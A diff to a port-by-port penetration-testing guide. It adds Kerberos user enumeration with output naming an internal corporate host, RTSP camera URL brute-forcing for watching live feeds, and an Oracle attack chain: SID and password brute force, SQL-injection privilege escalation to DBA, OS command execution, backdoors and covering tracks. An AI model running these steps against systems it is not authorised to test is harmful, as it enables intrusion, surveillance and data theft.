@@ -52,11 +52,13 @@ Let's move <strong>port by port</strong> and check what metasploit framework and
 <ul>
 <li>FTP | Port 21</li>
 <li>SSH | Port 22</li>
-<li> Telnet | Port 23</li>
+<li>Telnet | Port 23</li>
 <li>SMTP | Port 25 and Submission Port 587</li>
-<li> DNS | Port 53</li>
+<li>DNS | Port 53</li>
 <li>Finger | Port 79</li>
 <li>HTTP </li>
+<li>Kerberos | Port 88</li>
+<li>NetBios</li>
 <li>POP3 | Port 110</li>
 <li>RPCInfo | Port 111</li>
 <li>Ident | Port 113</li>
@@ -76,6 +78,7 @@ Let's move <strong>port by port</strong> and check what metasploit framework and
 <li>MS-SQL | Port 1433</li>
 <li>Oracle | Port 1521</li>
 <li>MySQL | Port 3306</li>
+<li>ISCSI | Port 3260</li>
 <li>Postgresql | Port 5432</li>
 <li>VNC | Port 5900</li>
 <li>X11 | Port 6000</li>
@@ -85,7 +88,7 @@ Let's move <strong>port by port</strong> and check what metasploit framework and
 <li>Memcache | Port 11211</li>
 <li>MongoDB | Port 27017 and Port 27018</li>
 <li>EthernetIP-TCP-UDP | Port 44818</li>
-<li> UDP BACNet | Port 47808</li>
+<li>UDP BACNet | Port 47808</li>
 </ul>
 
 ###FTP | Port 21
@@ -1263,7 +1266,18 @@ Nmap has
 The script should work against Active Directory. It needs a valid Kerberos REALM in order to operate.
 
 ```
-nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='VF-ROOT'" 10.74.251.24
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-23 12:13 IST
+Nmap scan report for ecindc312vw.internal.vodafone.com (10.74.251.24)
+Host is up (0.0015s latency).
+PORT   STATE SERVICE
+88/tcp open  kerberos-sec
+| krb5-enum-users: 
+| Discovered Kerberos principals
+|_    root@VF-ROOT
+
+Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
 ```</li>
 </ol>
 ###POP3 | Port 110
@@ -2680,7 +2694,26 @@ PORT     STATE SERVICE VERSION
 Service Info: Device: webcam
 ```
 </li>
-<li><a href="https://nmap.org/nsedoc/scripts/rtsp-url-brute.html">rtsp-url-brute.nse</a> which Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras.</li>
+<li><a href="https://nmap.org/nsedoc/scripts/rtsp-url-brute.html">rtsp-url-brute.nse</a> which Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras.
+<br>
+<br>
+RTSP URL Brute Sample Output:
+```
+Nmap scan report for 10.152.77.206
+Host is up (0.00047s latency).
+PORT    STATE SERVICE
+554/tcp open  rtsp
+| rtsp-url-brute: 
+|   Discovered URLs
+|     rtsp://10.152.77.206/media/video1
+|_    rtsp://10.152.77.206/video1
+
+```
+Once you have this, just execute mplayer to watch the live feed
+```
+mplayer <url>
+for example: mplayer rtsp://10.152.77.206/media/video1
+```</li>
 </ol>
 
 
@@ -3213,12 +3246,21 @@ See examples for Scott blogs, how to execute queries.
 
 ###Oracle | Port 1521
 
-After setting up oracle with metasploit here <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux">How to get Oracle Support working with Kali Linux</a>  
+After setting up oracle with metasploit here <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux">How to get Oracle Support working with Kali Linux</a>  We will directly follow the procedure presented by Chris Gates <a href="http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf">here</a>.
 
-<strong>Metasploit</strong> has
-
+<strong>Oracle Attack Methodology</strong>
+We need 4 things to connect to an Oracle DB.
 <ol>
-<li>we can use <strong>Oracle TNS Listener Service Version Query</strong>
+<li>IP.</li>
+<li>Port.</li>
+<li>Service Identifier (SID).</li>
+<li>Username/Password.</li>
+</ol>
+<ol>
+<li><strong>Locate Oracle Systems</strong>: Nmap would probably be the best tool to find the oracle instances.</li>
+<li><strong>Determine Oracle Version</strong>: Metasploit has 
+<ul>
+<li><strong>Oracle TNS Listener Service Version Query</strong>
 ```
 use auxiliary/scanner/oracle/tnslsnr_version 
 services -p 1521 -u -R
@@ -3232,6 +3274,151 @@ Sample Output:
 [+] 10.10.xx.xx:1521 Oracle - Version: 32-bit Windows: Version 10.2.0.1.0 - Production
 ```
 </li>
+</ul> </li>
+<li><strong>Determine Oracle SID</strong>: Oracle Service Identifier: By querying the TNS Listener directly, brute force for default SID's or query other components that may contain it. 
+<br>
+<br>
+<strong>Metasploit</strong> has 
+<ul>
+<li><strong>Oracle TNS Listener SID Enumeration</strong>: This module simply queries the TNS listner for the Oracle SID. With Oracle 9.2.0.8 and above the listener will be protected and the SID will have to be bruteforced or guessed.
+```
+use auxiliary/scanner/oracle/sid_enum
+```
+</li>
+<li>
+<strong>Oracle TNS Listener SID Bruteforce</strong>:   This module queries the TNS listner for a valid Oracle database instance name (also known as a SID). Any response other than a "reject" will be considered a success. If a specific SID is provided, that SID will be attempted. Otherwise, SIDs read from the named file will be attempted in sequence instead.
+```
+use auxiliary/scanner/oracle/sid_brute
+```
+Sample Output:
+```
+[*] 10.140.200.163:1521   -  - Oracle - Checking 'SA0'...
+[*] 10.140.200.163:1521   -  - Oracle - Refused 'SA0'
+[*] 10.140.200.163:1521   -  - Oracle - Checking 'PLSEXTPROC'...
+[+] 10.140.200.163:1521   - 10.140.200.163:1521 Oracle - 'PLSEXTPROC' is valid
+
+```
+</li>
+</ul>
+<strong>Nmap</strong> has:
+<ul>
+<li>
+<a href="https://nmap.org/nsedoc/scripts/oracle-sid-brute.html">Oracle-sid-brute</a>: Guesses Oracle instance/SID names against the TNS-listener.
+```
+nmap --script=oracle-sid-brute --script-args=oraclesids=/path/to/sidfile -p 1521-1560 <host>
+nmap --script=oracle-sid-brute -p 1521-1560 <host>
+```
+</li></ul>
+A good white paper on guessing the Service Identifier is <a href="http://www.dsecrg.com/files/pub/pdf/Different_ways_to_guess_Oracle_database_SID_(eng).pdf">Different ways to guess Oracle database SID</a></li>
+<li><strong>Guess/Bruteforce USER/PASS</strong>:
+Once we know the service identifier, we need to find out a valid username and password..
+
+<strong>Metasploit</strong> has
+<ul>
+<li><strong>Oracle RDBMS Login Utility</strong>: It actually runs nmap in the background, requires RHOSTS, RPORTS, SID to test the default usernames and passwords.
+```
+use auxiliary/scanner/oracle/oracle_login
+```</li>
+</ul>
+
+<strong>Nmap</strong> has 
+<ul><li><a href="https://nmap.org/nsedoc/scripts/oracle-brute.html">Oracle-brute</a>:Performs brute force password auditing against Oracle servers. Running it in default mode it performs an audit against a list of common Oracle usernames and passwords. The mode can be changed by supplying the argument oracle-brute.nodefault at which point the script will use the username- and password- lists supplied with Nmap. The script makes no attempt to discover the amount of guesses that can be made before locking an account. Running this script may therefor result in a large number of accounts being locked out on the database server.
+```
+nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL <host>
+```
+</li>
+<li><a href="https://nmap.org/nsedoc/scripts/oracle-brute-stealth.html">oracle-brute-stealth</a>: Exploits the CVE-2012-3137 vulnerability, a weakness in Oracle's O5LOGIN authentication scheme. The vulnerability exists in Oracle 11g R1/R2 and allows linking the session key to a password hash. When initiating an authentication attempt as a valid user the server will respond with a session key and salt. Once received the script will disconnect the connection thereby not recording the login attempt. The session key and salt can then be used to brute force the users password.
+<br>
+<br>
+CVE-2012-3137: The authentication protocol in Oracle Database Server 10.2.0.3, 10.2.0.4, 10.2.0.5, 11.1.0.7, 11.2.0.2, and 11.2.0.3 allows remote attackers to obtain the session key and salt for arbitrary users, which leaks information about the cryptographic hash and makes it easier to conduct brute force password guessing attacks, aka "stealth password cracking vulnerability.
+```
+nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL <host>
+```
+</li>
+<li><a href="https://nmap.org/nsedoc/scripts/oracle-enum-users.html">Oracle-enum-users</a>:Attempts to enumerate valid Oracle user names against unpatched Oracle 11g servers (this bug was fixed in Oracle's October 2009 Critical Patch Update).
+```
+nmap --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt -p 1521-1560 <host>
+```
+</li></ul>
+</li>
+<li>Privilege Escalation via SQL Injection:
+<ul>
+<li>lt_findricset.rb</li>
+<li>lt_findricset_cursor.rb: Oracle DB SQL Injection via SYS.LT.FINDRICSET Evil Cursor Method:   This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.LT.FINDRICSET package via Evil Cursor technique. Tested on oracle 10.1.0.3.0 -- should work on thru 10.1.0.5.0 and supposedly on 11g. Fixed with Oracle Critical Patch update October 2007.
+```
+use auxiliary/sqli/oracle/lt_findricset_cursor
+```</li>
+<li>dbms_metadata_open.rb: Oracle DB SQL Injection via SYS.DBMS_METADATA.OPEN:   This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.DBMS_METADATA.OPEN package/function.</li>
+<li>dbms_cdc_ipublish: Oracle DB SQL Injection via SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE:   The module exploits an sql injection flaw in the ALTER_HOTLOG_INTERNAL_CSOURCE procedure of the PL/SQL package 
+  DBMS_CDC_IPUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege. Affected versions:  Oracle Database Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU.
+</li>
+<li>dbms_cdc_publish: Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.ALTER_AUTOLOG_CHANGE_SOURCE: The module exploits an sql injection flaw in the ALTER_AUTOLOG_CHANGE_SOURCE procedure of the PL/SQL package 
+  DBMS_CDC_PUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege. Affected versions: 
+  Oracle Database Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU. </li>
+<li>dbms_cdc_publish2: Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE: The module exploits an sql injection flaw in the DROP_CHANGE_SOURCE procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with 
+  execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege.</li>
+<li>dbms_cdc_publish3: Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.CREATE_CHANGE_SET: The module exploits an sql injection flaw in the CREATE_CHANGE_SET procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with 
+  execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege.</li>
+<li>dbms_cdc_subscribe_activate_subscription: Oracle DB SQL Injection via SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION: This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the 
+  SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION package/function. This vulnerability affects to Oracle Database Server 9i up to 9.2.0.5 and 10g up to 10.1.0.4.</li>
+<li>lt_compressworkspace.rb: Oracle DB SQL Injection via SYS.LT.COMPRESSWORKSPACE:   This module exploits an sql injection flaw in the COMPRESSWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute 
+  privilege on the vulnerable package can exploit this vulnerability.</li>
+<li>lt_mergeworkspace.rb: Oracle DB SQL Injection via SYS.LT.MERGEWORKSPACE:   This module exploits an sql injection flaw in the MERGEWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability.</li>
+<li>lt_removeworkspace.rb: Oracle DB SQL Injection via SYS.LT.REMOVEWORKSPACE:   This module exploits an sql injection flaw in the REMOVEWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability. </li>
+<li>lt_rollbackworkspace.rb: Oracle DB SQL Injection via SYS.LT.ROLLBACKWORKSPACE:   This module exploits an sql injection flaw in the ROLLBACKWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability.</li>
+</ul></li>
+<li>Manipulate Data/Post Exploitation:
+The above privilege escalation exploits will provide us DBA access, from where we can access the data. We can use 
+<ul>
+<li>Metasploit oracle_sql: Oracle SQL Generic Query: This module allows for simple SQL statements to be executed against a Oracle instance given the appropriate credentials and sid.
+```
+use auxiliary/admin/oracle/oracle_sql
+```</li>
+or you can directly connect to the database using
+<li>SQLPlus
+```
+sqlplus username/password@host:port/service
+```
+or use tnsnames.ora file to connect to the database. For that edit it and add a new entry: This file normally resides in the $ORACLE HOME\NETWORK\ADMIN directory.
+```
+myDb  =
+ (DESCRIPTION =
+   (ADDRESS_LIST =
+     (ADDRESS = (PROTOCOL = TCP)(Host = c)(Port =a))
+   )
+ (CONNECT_DATA =
+   (SERVICE_NAME =b)
+ )
+)
+```
+and then you could connect to the db:
+```
+sqlplus x/y@myDb
+```
+</li>
+</ul>
+However, there's more to Post Exploitation which are OS Shells. There are multiple methods for running OS commands via oracle libraries.
+<ul>
+<li>Via Java: 
+
+There's a metasploit
+<ul>
+<li>win32exec: Oracle Java execCommand (Win32):   This module will create a java class which enables the execution of OS commands. First, we need to grant the user privileges of JAVASYSPRIVS using oracle_sql module
+```
+use auxiliary/admin/oracle/post_exploitation/win32exec
+```</li>
+</ul>
+This can also be done by executing SQL Scripts provided by oracle. For more information refer <a href="http://www.oracle.com/technetwork/database/enterprise-edition/calling-shell-commands-from-plsql-1-1-129519.pdf">Executing operating system commands from PL/ SQL.</a>
+</li>
+<li>Extproc backdoors</li>
+<li>DBMS_Scheduler</li>
+<li>Run custom pl/sql or java</li>
+</ul></li>
+<li>Cover Tracks.<li>
+</ol>
+<strong>Metasploit</strong> has
+
+<ol>
 
 <li>
 We can use <strong>Oracle TNS Listener Checker</strong> which module checks the server for vulnerabilities like TNS Poison.
@@ -3249,17 +3436,14 @@ Sample Output:
 </li>
 
 <li>
-We can also use <strong>Oracle TNS Listener SID Bruteforce</strong> which queries the TNS listner for a valid Oracle database instance name (also known as a SID). Oracle TNS Listener SID Enumeration can only be used if the oracle version is less than Oracle 9.2.xx.xx.
+
+Some SQL statements which could be executed after SQL Plus connection:
 ```
-use auxiliary/scanner/oracle/sid_brute
-services -p 1521 -u -R
+1. select * from global_name
+2. 
 ```
-Sample Output:
-```
-[+] 10.10.xx.xx:1521 Oracle - 'CLREXTPROC' is valid
-[*] 10.10.xx.xx:1521  - Oracle - Refused 'CLREXTPROC'
-[+] 10.10.xx.xx:1521 Oracle - 'CLREXTPROC' is valid
-```	
+
+A good blog to secure oracle is <a href="http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html">Top 10 Oracle Steps to a Secure Oracle Database Server</a>
 </li>
 
 ### ISCSI | Port 3260
@@ -3308,11 +3492,23 @@ Logging in to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-
 Login to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] successful.
 ```</li>
 
-<li> When we login, ideally we should be able to see the location, however for some strange reason we didn't got that here.
+<li> Failed Result: When we login, ideally we should be able to see the location, however for some strange reason we didn't got that here.
 ```
 [43852.014179] scsi host6: iSCSI Initiator over TCP/IP
 [43852.306055] scsi 6:0:0:0: Direct-Access     EMC      Celerra          0002 PQ: 1 ANSI: 5
 [43852.323940] scsi 6:0:0:0: Attached scsi generic sg1 type 0
+```</li>
+<li>Sucessful Result: If we see, the drive is attached to sdb1
+```
+[125933.964768] scsi host10: iSCSI Initiator over TCP/IP
+[125934.259637] scsi 10:0:0:0: Direct-Access     LIO-ORG  FILEIO           v2.  PQ: 0 ANSI: 2
+[125934.259919] sd 10:0:0:0: Attached scsi generic sg1 type 0
+[125934.266155] sd 10:0:0:0: [sdb] 2097152001 512-byte logical blocks: (1.07 TB/1000 GiB)
+[125934.266794] sd 10:0:0:0: [sdb] Write Protect is off
+[125934.266801] sd 10:0:0:0: [sdb] Mode Sense: 2f 00 00 00
+[125934.268003] sd 10:0:0:0: [sdb] Write cache: disabled, read cache: enabled, doesn't support DPO or FUA
+[125934.275206]  sdb: sdb1
+[125934.279017] sd 10:0:0:0: [sdb] Attached SCSI dis
 ```</li>
 <li>We can logout using --logout
 ```
